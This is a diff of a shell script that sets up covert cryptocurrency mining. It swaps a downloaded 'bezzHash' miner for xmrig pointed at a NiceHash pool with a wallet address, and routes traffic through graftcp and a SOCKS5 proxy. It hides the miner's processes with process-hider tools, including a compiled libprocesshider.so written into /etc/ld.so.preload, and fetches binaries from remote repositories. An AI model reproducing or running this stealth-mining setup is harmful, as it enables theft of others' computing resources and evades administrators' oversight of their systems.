@@ -6,10 +6,6 @@ npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-
-
-
-
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
@@ -41,22 +37,16 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-ph add bezzHash
-sleep 9
-ph add bezzHash
-sleep 9
-ph add bezzHash
-sleep 9
-ph add bezzHash
-sleep 9
-ph add bezzHash
-sleep 30
+./graftcp/graftcp wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz
+tar -zxf xmrig-6.16.2-bionic-x64.tar.gz
+cd xmrig-6.16.2
+chmod +x xmrig
+ph add xmrig
+
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.kupool.com:443
+./graftcp/graftcp ./xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -a RandomX -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.KHAILLA --threads=1 -x socks5://192.252.211.197:14921
